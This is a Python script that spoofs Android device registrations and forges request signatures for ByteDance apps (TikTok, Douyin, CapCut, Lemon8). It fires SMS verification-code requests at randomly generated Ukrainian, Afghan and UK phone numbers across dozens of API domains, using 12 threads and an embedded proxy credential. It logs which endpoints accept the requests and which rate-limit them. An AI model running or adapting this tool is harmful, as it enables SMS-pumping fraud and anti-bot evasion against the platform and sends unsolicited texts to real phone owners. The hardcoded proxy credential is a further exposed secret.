"""
Domain Refresh Scan — Find NEW working domains for all success apps.
Tests comprehensive set of ByteDance domains across all working AIDs.
Focuses on AID=2658 especially.
"""
import requests
import random
import time
import json
import hashlib
import uuid
import string
import urllib3
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

urllib3.disable_warnings()

try:
    from SignerPy import sign as sp_sign, xor
    SIGNER_OK = True
except ImportError:
    SIGNER_OK = False

PROXY = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-US:j8BogunPuMmSaOEU@geo.g-w.info:10080'
REGISTER_DOMAIN = "api3-normal-c-lf.amemv.com"

# ====== COMPREHENSIVE DOMAIN LIST ======
# Original tiktokv.com domains
TIKTOKV_DOMAINS = [
    "api16-normal-c-alisg.tiktokv.com", "api-t2.tiktokv.com", "api-va.tiktokv.com",
    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-useast5.us.tiktokv.com", "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com", "api16.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com", "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-c-useast2a.tiktokv.com", "api19-normal-useast5.us.tiktokv.com",
    "api19.tiktokv.com", "api21-normal-c-alisg.tiktokv.com",
    "api21-normal-c-useast2a.tiktokv.com",
]

# NEW domains to discover — ibytedtos, byteoversea, musical.ly, etc.
NEW_DOMAINS_TO_TEST = [
    # ibytedtos.com passport domains
    "api16-passport-va.ibytedtos.com",
    "api19-passport-va.ibytedtos.com",
    "api21-passport-va.ibytedtos.com",
    "sf16-passport-va.ibytedtos.com",
    "sf19-passport-va.ibytedtos.com",
    # byteoversea domains
    "api16-normal-c-useast2a.byteoversea.com",
    "api16-normal-c-alisg.byteoversea.com",
    "api19-normal-c-useast2a.byteoversea.com",
    "api16.byteoversea.com",
    "api19.byteoversea.com",
    # musical.ly legacy
    "api2-16-h2.musical.ly",
    "api2-19-h2.musical.ly",
    "api2-21-h2.musical.ly",
    "api16-core-c-useast1a.musical.ly",
    # tiktokd domains
    "api16-normal-c-useast2a.tiktokd.com",
    "api19-normal-c-useast2a.tiktokd.com",
    # byteintl
    "api16.byteintl.net",
    "api19.byteintl.net",
    # ttlivecdn/tiktokcdn
    "api16-normal-c-useast2a.ttlivecdn.com",
    # More tiktokv patterns
    "api22-normal-c-useast2a.tiktokv.com",
    "api22-normal-c-alisg.tiktokv.com",
    "api22.tiktokv.com",
    "api-h2.tiktokv.com",
    "api16-normal-c-useast1a-h2.tiktokv.com",
    "api16-core-c-useast2a.tiktokv.com",
    "api19-core-c-useast2a.tiktokv.com",
    "api21-core-c-useast2a.tiktokv.com",
    "api16-core-c-alisg.tiktokv.com",
    "api19-core-c-alisg.tiktokv.com",
    "api21-core-c-alisg.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.us",
    "api19-normal-c-useast1a.tiktokv.us",
    # Web domains
    "www.tiktok.com", "us.tiktok.com", "www.capcut.com",
    # Chinese domains
    "api3-normal-c-lf.amemv.com", "is.snssdk.com",
    "api5-normal-c-lf.amemv.com", "api5.pipix.com", "api3.pipix.com",
    # Lemon8 domains
    "api16-normal-c-useast2a.lemon8-app.com",
    "api19-normal-c-useast2a.lemon8-app.com",
    "api.lemon8-app.com",
    # Hypic domains
    "api16-normal-c-useast2a.hypic.app",
]

# Success apps from previous sessions
APPS = [
    {"aid": 1233, "app_name": "musical_ly", "name": "TikTok Global", "signed": True},
    {"aid": 1340, "app_name": "trill", "name": "TikTok Lite", "signed": True},
    {"aid": 3006, "app_name": "vicut", "name": "CapCut", "signed": True},
    {"aid": 1180, "app_name": "musical_ly", "name": "Helo", "signed": True},
    {"aid": 2658, "app_name": "musical_ly", "name": "BD 2658 (Lemon8?)", "signed": True},
    {"aid": 7743, "app_name": "musical_ly", "name": "BD 7743", "signed": True},
    {"aid": 1128, "app_name": "aweme", "name": "Douyin", "signed": True},
    {"aid": 1319, "app_name": "super", "name": "Pipix", "signed": True},
    {"aid": 1988, "app_name": "douyin_web", "name": "Douyin Web", "signed": False},
    {"aid": 1459, "app_name": "tiktok_web", "name": "TikTok Web", "signed": False},
]

TYPE_CODES = [3635, 3637, 3634, 3631, 3733, 3734, 3132, 3536, 3731, 3730, 3532, 34, 3530]
DEVICE_BRANDS = {"Samsung": ["SM-G991B", "SM-S908B"], "Xiaomi": ["M2102K1G"], "Google": ["Pixel 7"]}
ANDROID_VERSIONS = ["12", "13", "14"]
API_LEVELS = {"12": "31", "13": "33", "14": "34"}
BUILD_IDS = ["UP1A.231005.007", "TQ3A.230901.001"]

lock = threading.Lock()
completed = 0
successes = []
rate_limited = []
phones_used = set()
phone_lock = threading.Lock()

def fresh_phone():
    with phone_lock:
        while True:
            prefix = random.choice(['+38050','+38067','+38096','+38097','+38099',
                                    '+93070','+93072','+93073','+93074','+93075',
                                    '+93078','+93079','+44770','+44771','+44772'])
            p = prefix + str(random.randint(1000000, 9999999))
            if p not in phones_used:
                phones_used.add(p)
                return p

def register_device(aid, app_name, proxy=PROXY, domain=REGISTER_DOMAIN):
    brand = random.choice(list(DEVICE_BRANDS.keys()))
    model = random.choice(DEVICE_BRANDS[brand])
    av = random.choice(ANDROID_VERSIONS)
    api_lvl = API_LEVELS[av]
    build_id = random.choice(BUILD_IDS)
    resolution = random.choice(["1080*2400", "1080*2340"])
    dpi = random.choice(["420", "480"])
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4())
    ts = int(time.time())
    params = {"aid": str(aid), "app_name": app_name, "version_code": "350804",
              "version_name": "35.8.4", "device_platform": "android", "os": "android",
              "os_api": api_lvl, "os_version": av, "device_type": model, "device_brand": brand,
              "language": "en", "ac": "wifi", "channel": "googleplay",
              "resolution": resolution, "dpi": dpi, "openudid": openudid, "cdid": cdid,
              "ts": str(ts), "_rticket": str(ts*1000)}
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": f"App_{aid}", "update_version_code": 350804, "manifest_version_code": 350804,
        "aid": aid, "channel": "googleplay", "package": "com.zhiliaoapp.musically",
        "app_version": "35.8.4", "version_code": 350804, "sdk_version": "2.14.0-rc.8",
        "os": "Android", "os_version": av, "os_api": int(api_lvl),
        "device_model": model, "device_brand": brand, "device_manufacturer": brand,
        "cpu_abi": "arm64-v8a", "release_build": "f66b21c_20241009",
        "density_dpi": int(dpi), "display_density": "xxhdpi",
        "resolution": resolution.replace("*","x"), "language": "en", "timezone": 5,
        "access": "wifi", "cdid": cdid, "sig_hash": "aea615ab", "openudid": openudid,
        "clientudid": str(uuid.uuid4()), "region": "US",
    }, "_gen_ts": ts})
    url = f"https://{domain}/service/2/device_register/?{urlencode(params)}"
    ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {av}; en_US; {model}; Build/{build_id})"
    s = requests.Session()
    s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers={"Host": domain, "User-Agent": ua,
            "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate"}, verify=False, timeout=10)
        if r.status_code == 200:
            d = r.json()
            return {"device_id": str(d["device_id"]), "iid": str(d["install_id"]),
                    "brand": brand, "model": model, "av": av, "api_lvl": api_lvl,
                    "build_id": build_id, "resolution": resolution, "dpi": dpi,
                    "openudid": openudid, "cdid": cdid, "ua": ua,
                    "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                    "csrf": ''.join(random.choices('0123456789abcdef', k=32))}
    except: pass
    finally: s.close()
    return None

def test_signed(domain, app, phone, tc):
    dev = register_device(app["aid"], app["app_name"])
    if not dev: return None
    encrypted = xor(phone)
    ts = int(time.time())
    rticket = str(ts * 1000 + random.randint(1000, 9999))
    common = {"passport-sdk-version": "50559", "iid": dev["iid"], "device_id": dev["device_id"],
              "ac": "wifi", "channel": "googleplay", "aid": str(app["aid"]),
              "app_name": app["app_name"], "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "ssmix": "a",
              "device_type": dev["model"], "device_brand": dev["brand"], "language": "en",
              "os_api": dev["api_lvl"], "os_version": dev["av"],
              "manifest_version_code": "350804", "resolution": dev["resolution"],
              "dpi": dev["dpi"], "update_version_code": "350804",
              "cdid": dev["cdid"], "carrier_region": "PK"}
    url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(ts)
    body_p = dict(common)
    body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                   "mix_mode": "1", "mobile": encrypted, "type": str(tc),
                   "_rticket": rticket, "ts": str(ts)})
    url_str = urlencode(url_p); body = urlencode(body_p)
    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"
    try:
        sigs = sp_sign(params=url_str, payload=body, cookie=cookies, version=8404, aid=app["aid"])
    except: return None
    headers = {"Host": domain, "Cookie": cookies, "X-SS-REQ-TICKET": rticket,
               "sdk-version": "2", "passport-sdk-version": "50559",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-SS-DP": str(app["aid"]), "User-Agent": dev["ua"],
               "Accept-Encoding": "gzip, deflate",
               "X-Gorgon": sigs.get("x-gorgon",""), "X-Khronos": sigs.get("x-khronos",str(ts)),
               "X-Argus": sigs.get("x-argus",""), "X-Ladon": sigs.get("x-ladon",""),
               "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper())}
    url = f"https://{domain}/passport/mobile/send_code/v1/?{url_str}"
    s = requests.Session(); s.proxies = {"http": PROXY, "https": PROXY}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""), 
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:50] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:50]}
    finally: s.close()

def test_web(domain, app, phone, tc):
    encrypted = ''.join(format(ord(c) ^ 5, '02x') for c in phone)
    body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(app["aid"]),
                      "app_name": app["app_name"], "account_sdk_source": "web",
                      "mix_mode": "1", "auto_read": "0"})
    url = f"https://{domain}/passport/web/send_code/?aid={app['aid']}&app_name={app['app_name']}"
    headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
               "Origin": f"https://{domain}", "Referer": f"https://{domain}/", "X-SS-DP": str(app["aid"])}
    s = requests.Session(); s.proxies = {"http": PROXY, "https": PROXY}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:50] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:50]}
    finally: s.close()

def run_test(domain, app, tc):
    global completed
    phone = fresh_phone()
    if app["signed"] and SIGNER_OK:
        r = test_signed(domain, app, phone, tc)
    else:
        r = test_web(domain, app, phone, tc)
    if not r:
        with lock: completed += 1
        return
    with lock:
        completed += 1
        if r["msg"] == "success":
            successes.append({"domain": domain, "app": app["name"], "aid": app["aid"], "tc": tc, "phone": phone})
            print(f"\r  *** SUCCESS *** {app['name']:20} AID={app['aid']} domain={domain} tc={tc}           ")
        elif r["ec"] == 7:
            rate_limited.append({"domain": domain, "app": app["name"], "aid": app["aid"], "tc": tc})
            print(f"\r  ** RL ** {app['name']:20} AID={app['aid']} domain={domain} tc={tc}                   ")
        if completed % 50 == 0:
            print(f"\r  Progress: {completed} | S:{len(successes)} RL:{len(rate_limited)}", end="", flush=True)

def main():
    global completed
    ALL_DOMAINS = list(set(TIKTOKV_DOMAINS + NEW_DOMAINS_TO_TEST))
    
    tasks = []
    # Priority 1: AID=2658 on ALL domains with ALL type codes
    for domain in ALL_DOMAINS:
        for tc in TYPE_CODES:
            tasks.append((domain, APPS[4], tc))  # AID=2658
    
    # Priority 2: All success apps on NEW domains
    for domain in NEW_DOMAINS_TO_TEST:
        for app in APPS:
            tc = random.choice(TYPE_CODES)
            tasks.append((domain, app, tc))
    
    # Priority 3: All success apps on known domains with different type codes
    for app in APPS[:6]:  # Main success apps
        for tc in TYPE_CODES:
            domain = random.choice(TIKTOKV_DOMAINS)
            tasks.append((domain, app, tc))
    
    random.shuffle(tasks)
    
    print(f"DOMAIN REFRESH SCAN")
    print(f"Tasks: {len(tasks)} | Domains: {len(ALL_DOMAINS)} | Apps: {len(APPS)}")
    print(f"Type codes: {len(TYPE_CODES)} | SignerPy: {SIGNER_OK}")
    print("="*70)
    
    start = time.time()
    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = [ex.submit(run_test, d, a, t) for d, a, t in tasks]
        try:
            for f in as_completed(futures): f.result()
        except KeyboardInterrupt: print("\nInterrupted!")
    
    elapsed = time.time() - start
    print(f"\n\n{'='*70}")
    print(f"COMPLETE: {completed} tests in {elapsed:.0f}s")
    print(f"\n*** SUCCESSES ({len(successes)}) ***")
    for s in successes: print(f"  {s}")
    print(f"\n** RATE LIMITED ({len(rate_limited)}) **")
    for r in rate_limited: print(f"  {r}")
    
    with open("/home/ubuntu/domain_refresh_results.json", "w") as f:
        json.dump({"successes": successes, "rate_limited": rate_limited, "total": completed}, f, indent=2)
    print(f"\nSaved to /home/ubuntu/domain_refresh_results.json")


if __name__ == "__main__":
    main()
